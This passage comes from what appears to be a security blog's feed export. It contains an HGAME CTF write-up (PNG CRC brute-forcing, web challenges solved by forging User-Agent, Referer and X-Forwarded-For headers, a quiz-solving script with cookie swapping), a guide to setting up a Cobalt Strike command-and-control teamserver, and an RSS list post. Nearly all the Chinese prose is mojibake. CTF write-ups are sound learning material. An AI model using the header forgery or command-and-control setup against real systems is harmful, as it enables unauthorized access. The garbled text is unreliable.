src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2202810146.png"></p><p>é™„ä¸Šè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;1.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == <span class="number">0xEB1EA007</span>):</span><br><span class="line">            print(i, j)</span><br><span class="line">            print(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br></pre></td></tr></table></figure><h2 id="4-Word-RE-MASTER"><a href="#4-Word-RE-MASTER" class="headerlink" title="4.Word RE:MASTER"></a>4.Word RE:MASTER</h2><blockquote><p>timmixä¸çŸ¥æ‰€è¸ªï¼Œåªç•™ä¸‹äº†ä¸¤ä¸ªwordæ–‡æ¡£ï¼Œä½œä¸ºwordä¸“å®¶çš„ä½ èƒ½å¸®å¿™æ‰¾å‡ºä»–çš„å»å‘å—ï¼Ÿ</p><p><a href="https://blog.harvey.plus/usr/uploads/2021/2/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip"><strong>é™„ä»¶</strong></a></p></blockquote><p>å¾ˆæ˜æ˜¾éœ€è¦é€šè¿‡first.docxå¾—åˆ°å¯†ç æ‰“å¼€maimai.docxï¼Œäºæ˜¯å°†å…¶å˜æˆå‹ç¼©åŒ…æŸ¥çœ‹å‘ç°åœ¨<code>first.zip\word\password.xml</code>ç›®å½•ä¸‹æ‰¾åˆ°å¯†ç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3036120003.png"></p><p>æ ¹æ®åŸæ–‡æç¤ºå¾—çŸ¥åº”è¯¥æ˜¯brainfuckè§£ç å¾—åˆ°æœ€ç»ˆå¯†ç DOYOUKNOWHIDDEN?</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2123557118.png"></p><p>æ¥ç€æ ¹æ®å›¾ç‰‡æç¤ºåº”è¯¥æ˜¯<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html"><strong>snowéšå†™ï¼šåœ¨çº¿å·¥å…·</strong></a></p><p>åˆ›å»ºä¸€ä¸ªsnow.htmlçš„æ–‡ä»¶å¹¶å°†ä¿¡æ¯å¤åˆ¶ç²˜è´´è¿›å»</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3333437075.png"></p><p>æ”¾å…¥æœåŠ¡å™¨ç”Ÿæˆå¯¹åº”é“¾æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2141825541.png"></p><p>æœ€åè§£å¯†å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1961670057.png"></p><h1 id="0X2Web"><a href="#0X2Web" class="headerlink" title="0X2Web"></a>0X2Web</h1><h2 id="1-Hitchhiking-in-the-Galaxy"><a href="#1-Hitchhiking-in-the-Galaxy" class="headerlink" title="1.Hitchhiking_in_the_Galaxy"></a>1.Hitchhiking_in_the_Galaxy</h2><blockquote><p>ç¬¬ä¸€æ¬¡åœ¨é“¶æ²³ç³»é‡Œæ­é¡ºé£è½¦ï¼Œè¦å‡†å¤‡å•¥ï¼Œåœ¨çº¿ç­‰ï¼ŒæŒºæ€¥çš„<br>Challenge Address<br><a href="http://hitchhiker42.0727.site/">http://hitchhiker42.0727.site</a>:42420</p></blockquote><p>F12æŸ¥çœ‹æºç å‘ç°<code>HitchhikerGuide.php</code>å¹¶ä¸”è®¿é—®ä¼šè·³è½¬è‡³<code>index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3459158084.png"></p><p>äºæ˜¯burpè¿›è¡ŒæŠ“åŒ…ï¼Œå¹¶ä¸”å¾—æŠ“åˆ°<code>HitchhikerGuide.php</code>çš„åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1296440783.png"></p><p>æŸ¥çœ‹å“åº”å¹¶ä¿®æ”¹è¯·æ±‚å¤´ï¼ˆGET-&gt;POSTï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3444721393.png"></p><p>å‘ç°éœ€è¦ä¼ªé€ å¼•æ“ï¼ˆUser-Agentå¤„åé¢åŠ ä¸ŠInfinite Improbability Driveï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/243769077.png"></p><p>åˆå‘ç°éœ€è¦é€šè¿‡<code>https://cardinal.ink/</code>è®¿é—®ï¼ˆReferer:<a href="https://cardinal.ink/%EF%BC%89">https://cardinal.ink/ï¼‰</a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/493505758.png"></p><p>ä¼ªé€ IPå¾—åˆ°flagï¼ˆX-Forwarded-For: 127.0.0.1ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2781204128.png"></p><h2 id="2-watermelon"><a href="#2-watermelon" class="headerlink" title="2.watermelon"></a>2.watermelon</h2><blockquote><p>ç®€å•ä¸”ä¸Šå¤´çš„æ¸¸æˆ<br>Challenge Address<br><a href="http://watermelon.ryen.xyz/">http://watermelon.ryen.xyz</a>:800/</p></blockquote><p>cocos æ¸¸æˆçš„åŸç†ï¼Œå…¶æ ¸å¿ƒå°±æ˜¯xxx/src/project.js</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4164126969.png"></p><p>æœ€åbase64è§£ä¸€ä¸‹å°±å¾—åˆ°flagï¼šhgame{do_you_know_cocos_game?}</p><blockquote><p>ä¹Ÿå¯ä»¥é€šè¿‡æ§åˆ¶å°ä¿®æ”¹çº¢çº¿é«˜åº¦~è¿™æ ·å°±èƒ½è½»æ˜“è¾¾åˆ°ä¸¤åƒåˆ†å¾—åˆ°flag</p></blockquote><h2 id="3-å®è—èµ°ç§è€…"><a href="#3-å®è—èµ°ç§è€…" class="headerlink" title="3.å®è—èµ°ç§è€…"></a>3.å®è—èµ°ç§è€…</h2><blockquote><p>å®è—èµ°ç§è€… Switch å–œæ¬¢å·ç›—å¹¶å°†å¥‡ç‰¹çš„å®è—èµ°ç§åˆ°ä¸€äº›é»‘å¸‚å•†å®¶æ‰‹ä¸­ã€‚ ä¸ºäº†é˜»æ­¢å…¶ç»§ç»­ä½œæ¶ï¼Œè­¦æ¢ Liki å¥‰å‘½å°† Switch æŠ“æ•å½’æ¡ˆã€‚ è°ƒæŸ¥è¿‡ç¨‹ä¸­ï¼ŒLiki å‘ç° Switch å°†ä¸€ä¸ªç§˜å¯†è—åœ¨äº†ä¸€ä¸ªç§äººæœåŠ¡å™¨ä¸­ã€‚ è¿™æˆ–è®¸ä¼šæˆä¸ºåç»­è¿½æŸ¥ Switch çš„é‡å¤§çº¿ç´¢ï¼Œä½ èƒ½æ‰¾åˆ°è¿™ä¸ªç§˜å¯†å—ï¼Ÿ<br>Challenge Address<br><a href="http://thief.0727.site/">http://thief.0727.site</a>:80</p></blockquote><p>è¯·æ±‚èµ°ç§</p><h2 id="4-æ™ºå•†æ£€æµ‹é¸¡"><a href="#4-æ™ºå•†æ£€æµ‹é¸¡" class="headerlink" title="4.æ™ºå•†æ£€æµ‹é¸¡"></a>4.æ™ºå•†æ£€æµ‹é¸¡</h2><blockquote><p>åˆæœ‰è°ä¸çˆ±é«˜æ•°å‘¢ï¼Ÿåæ­£æˆ‘ä¸çˆ±ï¼ˆè¯·ä½¿ç”¨firefoxæµè§ˆå™¨æ‰“å¼€é¢˜ç›®ï¼‰<br>Challenge Address<br><a href="http://r4u.top/">http://r4u.top</a>:5000/</p></blockquote><p>åšå®Œä¸€ç™¾é“å³å¯å¾—åˆ°flagé™„ä¸Šè„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from sympy import *</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">session &#x3D; requests.session()</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;r4u.top:5000&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(101):</span><br><span class="line">    try:</span><br><span class="line">        questionRaw &#x3D; session.get(url + &quot;api&#x2F;getQuestion&quot;).content</span><br><span class="line">        print(&quot;[+] Parsing &#123;&#125;&quot;.format(questionRaw))</span><br><span class="line">        regex &#x3D; r&quot;([-+]&#123;1&#125;)&lt;&#x2F;mo&gt;&lt;mn&gt;(\d&#123;1,9&#125;)&lt;&#x2F;mn&gt;&lt;&#x2F;mrow&gt;&lt;mrow&gt;&lt;mn&gt;(\d&#123;1,9&#125;)&quot;</span><br><span class="line">        matches &#x3D; re.findall(regex, questionRaw.decode(&quot;UTF-8&quot;))</span><br><span class="line">        lowerLimit, upperLimit &#x3D; (int(matches[0][0] + matches[0][1]), int(matches[0][2]))</span><br><span class="line">        print(&quot;[+] Matching &#123;&#125; from &#123;&#125; to &#123;&#125;&quot;.format(matches, lowerLimit, upperLimit))</span><br><span class="line"></span><br><span class="line">        regex &#x3D; r&quot;&lt;mn&gt;(\d&#123;1,9&#125;)&lt;&#x2F;mn&gt;&lt;mi&gt;x&lt;&#x2F;mi&gt;&lt;mo&gt;([+-]&#123;1&#125;)&lt;&#x2F;mo&gt;&lt;mn&gt;(\d&#123;1,9&#125;)&quot;</span><br><span class="line">        matches &#x3D; re.findall(regex, questionRaw.decode(&quot;UTF-8&quot;))</span><br><span class="line">        arg1, operator, arg2 &#x3D; matches[0]</span><br><span class="line">        print(&quot;[+] Calculate &#123;&#125; with &#123;&#125; &#123;&#125; &#123;&#125;&quot;.format(matches, arg1, operator, arg2))</span><br><span class="line">        x &#x3D; symbols(&#39;x&#39;)</span><br><span class="line">        result &#x3D; &quot;%.2f&quot; % (integrate(int(arg1) * x + int(arg2), (x, lowerLimit, upperLimit)))</span><br><span class="line">        print(&quot;[+] Calculated result is &#123;&#125;&quot;.format(result))</span><br><span class="line"></span><br><span class="line">        response &#x3D; session.post(url + &quot;api&#x2F;verify&quot;, data&#x3D;json.dumps(&#123;&quot;answer&quot;: result&#125;), headers&#x3D;&#123;&#39;Content-Type&#39;: &#39;application&#x2F;json&#39;&#125;)</span><br><span class="line">        print(&quot;[*] Verify status is &#123;&#125;&quot;.format(response.content))</span><br><span class="line">        if b&quot;true&quot; in response.content:</span><br><span class="line">            print(&quot;[+] Verify correct with &#123;&#125;&quot;.format(result))</span><br><span class="line">            print(&quot;[*] Raw data is &#123;&#125;&quot;.format(response.content))</span><br><span class="line">        response.close()</span><br><span class="line">        status &#x3D; session.get(url + &quot;api&#x2F;getStatus&quot;).content</span><br><span class="line">        print(&quot;[*] Status is &#123;&#125;&quot;.format(status))</span><br><span class="line">        index &#x3D; session.get(url).content</span><br><span class="line">        print(&quot;[*] Index is &#123;&#125;&quot;.format(index))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">print(&quot;[+] Done All for you and cookie is &#123;&#125;&quot;.format(session.cookies))</span><br></pre></td></tr></table></figure><p>å…ˆåˆ é™¤åŸå…ˆçš„cookieï¼Œç„¶åå°†ç½‘é¡µçš„cookieæ›¿æ¢æˆè·‘å‡ºæ¥çš„cookie</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4213677248.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3197138214.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;&quot;session&#x3D;xxxxxx&quot; &#x2F;&#x2F;ä¿®æ”¹æµè§ˆå™¨ä¸Šçš„cookie</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2465855897.png"></p><p>å¥½å®¶ä¼™ä¸è®²æ­¦å¾·æœ€åè¿˜ç»™æˆ‘ä¸€é¢˜ï¼Œæ‰‹å·¥åšä¸€ä¸‹â‘§ï¼Œæœ€ç»ˆå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1224177566.png"></p><h2 id="5-èµ°ç§è€…çš„æ„¤æ€’"><a href="#5-èµ°ç§è€…çš„æ„¤æ€’" class="headerlink" title="5.èµ°ç§è€…çš„æ„¤æ€’"></a>5.èµ°ç§è€…çš„æ„¤æ€’</h2><blockquote><p>æœ¬é¢˜ä¸ºå®è—èµ°ç§è€…çš„æ›´æ”¹ç‰ˆæœ¬ï¼Œè€ƒç‚¹ç›¸åŒï¼Œè¯·å…ˆåšå‡ºå®è—èµ°ç§è€…<br>Liki æ—¥è®°ï¼š<br>2020å¹´2æœˆ2æ—¥ï¼š<br>ä»Šå¤©è­¦å±€å¯„æ¥ä¸€å°ä¿¡ï¼Œæ˜¯èµ°ç§è€… Switch å¯„æ¥çš„ï¼Œä¿¡é‡Œåªæœ‰ä¸€å¥è¯<br>â€œæˆ‘æœ€è®¨åŒé¡ºé£è½¦ï¼Œæˆ‘å°†å¸¦æ¥æˆ‘çš„æ„¤æ€’â€<br>çœŸæ˜¯è®©äººæ‘¸ä¸ç€å¤´è„‘â€¦â€¦<br>æˆ‘çœ‹ä¸æ‡‚ï¼Œä½†æˆ‘å¤§å—éœ‡æ’¼ã€‚<br>Challenge Address<br><a href="http://police.liki.link/">http://police.liki.link</a></p></blockquote><h1 id="0X3Crypto"><a href="#0X3Crypto" class="headerlink" title="0X3Crypto"></a>0X3Crypto</h1><h2 id="1-ã¾ã²ã¨"><a href="#1-ã¾ã²ã¨" class="headerlink" title="1.ã¾ã²ã¨"></a>1.ã¾ã²ã¨</h2><blockquote><p>å¤§å®¶å¥½ï¼Œæˆ‘å«çœŸäººï¼Œæ¥è‡ªå’’æœ¯å›æˆ˜ï¼Œä½ ä¹Ÿå¯ä»¥å«æˆ‘ï¼Œç¼åˆæ€ªï¼ï¼</p><p><a href="https://pan.baidu.com/s/1OdvdpH6_5vO0gx2JICb5nA"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šer9qï¼‰</p></blockquote><p>æ‘©æ–¯-&gt;ASCII-&gt;base64-&gt;Vigenere-Cipherï¼ˆç»´å‰å°¼äºšè§£å¯†ï¼Œkey=likiï¼‰<br>æœ€åä¸€æ³¢ç¥ä»™æ“ä½œï¼Œæˆ‘ç›´å‘¼å†…è¡Œ<br>æ …æ ï¼ˆkey=6ï¼‰-&gt;å‡¯æ’’ï¼ˆkey=13ï¼‰-&gt;é€†åºå¾—åˆ°flag</p><h2 id="2-Transformer"><a href="#2-Transformer" class="headerlink" title="2.Transformer"></a>2.Transformer</h2><blockquote><p>æ‰€æœ‰äººéƒ½å·²åšå¥½å‡†å¤‡,æœˆé»‘ä¹‹æ—¶å³å°†æ¥ä¸´,ä¸ºäº†å‡»æ¯æœ€åçš„ä¸»æ§èƒ½é‡æŸ±,æ‰“å¼€é€šå¾€èŠåŠ å“¥çš„å‡é™æ¡¥è¿«åœ¨çœ‰ç« çœ‹å®ˆå‡é™æ¡¥çš„æ§åˆ¶å‘˜å·²ç»å¤±è¸ª,å”¯æœ‰åœ¨æ§åˆ¶å°çš„å°æˆ¿é—´ç•™ä¸‹æ¥çš„å°çº¸æ¡,ä¼¼ä¹æ˜¯æ§åˆ¶å‘˜é˜²æ­¢è‡ªå·±è€äº†æŠŠå¯†ç å¿˜è®°è€Œå†™ä¸‹çš„,ä½†ä¼¼ä¹éƒ½æ˜¯å¥‡æ€ªçš„å­—æ¯ç»„åˆ,å”¯ä¸€æœ‰ä»·å€¼çš„çº¿ç´¢æ˜¯åƒåœ¾æ¡¶é‡Œçš„ä¸¤å †è¢«ç¢çº¸æœºç²‰ç¢çš„ç¢çº¸,éšä¾¿æŸ¥çœ‹å‡ å¼ ,ä¼¼ä¹æ˜¯ä¸¤ä»½æ–‡ä»¶,å¹¶ä¸”å…¶ä¸­ä¸€ä»½å’Œå°çº¸æ¡ä¸Šçš„å­—æ¯è§„å¾‹æœ‰ç‚¹ç›¸åƒ é™„ä»¶md5:0340142700c8f63546368fa14fd6fb24</p><p><a href="https://pan.baidu.com/s/1UaYVuW0CdZAXJb5Rp0nrDQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šx4dpï¼‰</p></blockquote><p><a href="https://quipqiup.com/"><strong>åœ¨çº¿å·¥å…·</strong></a><br>qypth=hgameè¿›è¡Œçˆ†ç ´</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2706249689.png"></p><h2 id="3-å¯¹ç§°ä¹‹ç¾"><a href="#3-å¯¹ç§°ä¹‹ç¾" class="headerlink" title="3.å¯¹ç§°ä¹‹ç¾"></a>3.å¯¹ç§°ä¹‹ç¾</h2><blockquote><p>ç¾æœ¯å¤§å¸ˆ Liki æ€»è¯´ï¼Œå¯¹ç§°æ˜¯ä¸–ç•Œä¸Šæœ€ç¾çš„ç»“æ„â€¦</p><p><a href="https://pan.baidu.com/s/1866PAY_o_KOdljPFyc34EQ">é™„ä»¶</a>ï¼ˆæå–ç ï¼š2hoyï¼‰</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HGAME </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡CSçš„æ­å»ºè¿‡ç¨‹</title>
      <link href="2021/02/03/%E8%AE%B0%E4%B8%80%E6%AC%A1CS%E7%9A%84%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/"/>
      <url>2021/02/03/%E8%AE%B0%E4%B8%80%E6%AC%A1CS%E7%9A%84%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‰è¨€ï¼šä¸ºæå‡å®æˆ˜æŠ€æœ¯å¹¶ç§¯ç´¯å®æˆ˜ç»éªŒï¼Œäºæ˜¯æˆ‘åœ¨vultræœåŠ¡å™¨ä¸Šç¬¬ä¸€æ¬¡æ­å»ºäº†CS<br>ç¯å¢ƒï¼š<br>Debian10<br>Cobalt Strike 4.1</p></blockquote><p>é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆè¦å‡†å¤‡ä¸€å°Debian10çš„æœåŠ¡å™¨ï¼ˆå…¶ä»–ä¹Ÿå¯ï¼‰<br>æ¥ç€æˆ‘ä»¬sshè¿ä¸ŠæœåŠ¡å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh root@IP        ç™»å½•ï¼ˆå›è½¦yesè¾“å…¥å¯†ç </span><br><span class="line">apt update        </span><br></pre></td></tr></table></figure><p>æ‰“å¼€sftpå°†csä¸Šä¼ ï¼ˆputä¸Šä¼ æ–‡ä»¶ getä¸‹è½½æ–‡ä»¶ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sftp root@IP    è¿›å…¥ftpï¼ˆå›è½¦è¾“å…¥å¯†ç </span><br><span class="line">ls        </span><br><span class="line">put C:\Users\xxx\cs4.1.zip        ä¸Šä¼ cs</span><br></pre></td></tr></table></figure><p>è¿”å›sshè§£å‹csï¼ˆUbuntué»˜è®¤æ˜¯æ²¡æœ‰å®‰è£…unzipï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install unzip        å®‰è£…unzip</span><br><span class="line">unzip cs4.1.zip        è§£å‹cs</span><br></pre></td></tr></table></figure><p>å®‰è£…java</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install default-jdk</span><br></pre></td></tr></table></figure><p>å¯åŠ¨cs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd cs4.1    è¿›å…¥csæ–‡ä»¶</span><br><span class="line">sudo .&#x2F;teamserver IP å¯†ç         å¯åŠ¨cså¹¶è®¾ç½®å¯†ç </span><br><span class="line">å¦‚æœæŠ¥é”™å‡ºç°æ— æ­¤å‘½ä»¤ï¼Œä½¿ç”¨â€œchmod 777 teamserverâ€æˆäºˆæƒé™å³å¯ã€‚</span><br></pre></td></tr></table></figure><p>ç»“æŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl c</span><br></pre></td></tr></table></figure><p>ç”±äºcsè¿æ¥å¾ˆå®¹æ˜“æ–­å¼€ï¼Œåœ¨å¯åŠ¨csä¹‹å‰æˆ‘ä»¬éœ€è¦å®‰è£…screenå¹¶å¯åŠ¨å®ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install screen</span><br><span class="line">apt-get install screen</span><br><span class="line">screen -S test        åˆ›å»ºä¸€ä¸ªåå­—ä¸ºtestçš„screenä¼šè¯</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CyberSecurityRSS</title>
      <link href="2021/02/01/CyberSecurityRSS/"/>
      <url>2021/02/01/CyberSecurityRSS/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä½œè€…:zer0yu<br>githubå¼€æºåœ°å€ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/zer0yu/CyberSecurityRSS</span></span><br></pre></td></tr></table></figure><h1 id="CyberSecurityRSS"><a href="#CyberSecurityRSS" class="headerlink" title="CyberSecurityRSS"></a>CyberSecurityRSS</h1><p>ç®€ä»‹: ç½‘ç»œå®‰å…¨ç›¸å…³çš„RSSè®¢é˜…ï¼Œå¸®åŠ©å»ºç«‹ä¸ªäººæƒ…æŠ¥æ¥æºå’Œæ—¥å¸¸çŸ¥è¯†åº“æ›´æ–° æ›´æ–°é¢‘ç‡: æ¯2ä¸ªæœˆä¸€æ¬¡<br>æ–‡ä»¶è¯´æ˜:<br>  1.é™„å½•åŠ ä¸€äº›å¯èƒ½æ²¡æœ‰rssçš„ç«™ç‚¹ï¼Œä½†æ˜¯æ˜¯æœ¬äººæ—¥å¸¸æµè§ˆçš„ä¸é”™ç«™ç‚¹ï¼Œé‡ç‚¹å†™å‡ºæ¥äº†ã€‚<br>  2.tiny.opmlæ˜¯ä¸ªäººé€Ÿè§ˆä½¿ç”¨çš„ä¸€ä¸ªç²¾ç®€ç‰ˆæœ¬ã€‚<br>  3.CyberSecurityRSS.xmlæ˜¯é›†åˆäº†æ³‰å“¥å’Œrrçš„ä¸€ä¸ªååˆ†ä¸°å¯Œçš„ç‰ˆæœ¬ï¼Œä¹Ÿåˆ†å¥½äº†ç±»åˆ«ã€‚</p><p>PS: å¦‚æœé‡åˆ°å¯¼å…¥æ–‡ä»¶æ ¼å¼é—®é¢˜çš„å¯ä»¥å°†xmlåç¼€ä¿®æ”¹ä¸ºopmlåç¼€ï¼Œåä¹‹ä¹Ÿå¯ã€‚</p><h2 id="ä½¿ç”¨æ–¹æ³•1-Reeder3-Reeder4-macOS-IOSçš„é¦–é€‰"><a href="#ä½¿ç”¨æ–¹æ³•1-Reeder3-Reeder4-macOS-IOSçš„é¦–é€‰" class="headerlink" title="ä½¿ç”¨æ–¹æ³•1 - Reeder3/Reeder4 (macOS, IOSçš„é¦–é€‰)"></a>ä½¿ç”¨æ–¹æ³•1 - Reeder3/Reeder4 (macOS, IOSçš„é¦–é€‰)</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2175787659.png"></p><h2 id="ä½¿ç”¨æ–¹æ³•2-yarr-macOS-Windows-Linux"><a href="#ä½¿ç”¨æ–¹æ³•2-yarr-macOS-Windows-Linux" class="headerlink" title="ä½¿ç”¨æ–¹æ³•2 - yarr (macOS, Windows, Linux)"></a>ä½¿ç”¨æ–¹æ³•2 - yarr (macOS, Windows, Linux)</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2163151798.png"></p><h2 id="ä½¿ç”¨æ–¹æ³•3-Leaf"><a href="#ä½¿ç”¨æ–¹æ³•3-Leaf" class="headerlink" title="ä½¿ç”¨æ–¹æ³•3 - Leaf"></a>ä½¿ç”¨æ–¹æ³•3 - Leaf</h2><p>ç›´æ¥å¯¼å…¥æä¾›çš„æ–‡ä»¶å³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/385235879.png"></p><h2 id="ä½¿ç”¨æ–¹æ³•4-Feedly"><a href="#ä½¿ç”¨æ–¹æ³•4-Feedly" class="headerlink" title="ä½¿ç”¨æ–¹æ³•4 - Feedly"></a>ä½¿ç”¨æ–¹æ³•4 - Feedly</h2><p>è¿™ç§æ˜¯ç½‘é¡µçš„å½¢å¼(å½“ç„¶ä¹Ÿæœ‰APP)ï¼Œfeedlyçš„å…è´¹ç‰ˆæœ¬ï¼Œtiny.opmlå¯ä»¥ç›´æ¥å¯¼å…¥å¹¶å¤Ÿç”¨ï¼Œä½†æ˜¯CyberSecurityRSS.xmlç‰ˆæœ¬ä¼šè¶…è¿‡å…è´¹çš„è®¢é˜…é™åˆ¶ã€‚</p><h2 id="ä½¿ç”¨æ–¹æ³•5-æ·±è“é˜…è¯»"><a href="#ä½¿ç”¨æ–¹æ³•5-æ·±è“é˜…è¯»" class="headerlink" title="ä½¿ç”¨æ–¹æ³•5 - æ·±è“é˜…è¯»"></a>ä½¿ç”¨æ–¹æ³•5 - æ·±è“é˜…è¯»</h2><p>åŒ1</p><h2 id="ä½¿ç”¨æ–¹æ³•6-Feeder-Androidæ¨èä½¿ç”¨"><a href="#ä½¿ç”¨æ–¹æ³•6-Feeder-Androidæ¨èä½¿ç”¨" class="headerlink" title="ä½¿ç”¨æ–¹æ³•6 - Feeder(Androidæ¨èä½¿ç”¨)"></a>ä½¿ç”¨æ–¹æ³•6 - Feeder(Androidæ¨èä½¿ç”¨)</h2><p>åŒ1</p><h2 id="ä½¿ç”¨æ–¹æ³•7-Zr-Androidæ¨èä½¿ç”¨"><a href="#ä½¿ç”¨æ–¹æ³•7-Zr-Androidæ¨èä½¿ç”¨" class="headerlink" title="ä½¿ç”¨æ–¹æ³•7 - Zr(Androidæ¨èä½¿ç”¨)"></a>ä½¿ç”¨æ–¹æ³•7 - Zr(Androidæ¨èä½¿ç”¨)</h2><p>åŒ1</p><h1 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h1><p>others.mdä¸­æ˜¯æˆ‘ä¸€èˆ¬ä¼šä¸»åŠ¨æµè§ˆçš„ç«™ç‚¹å¹¶ä¸”ä¸€äº›ç«™ç‚¹æ²¡æœ‰æä¾›rssçš„éƒ½å†™åœ¨äº†é‡Œé¢ã€‚</p><p>ä»¥ä¸‹ä¸ºä½¿ç”¨æˆªå›¾<br>æŒæ¡å„ç±»æ¨é€ä¿¡æ¯ ååˆ†æ–¹ä¾¿</p><p><img 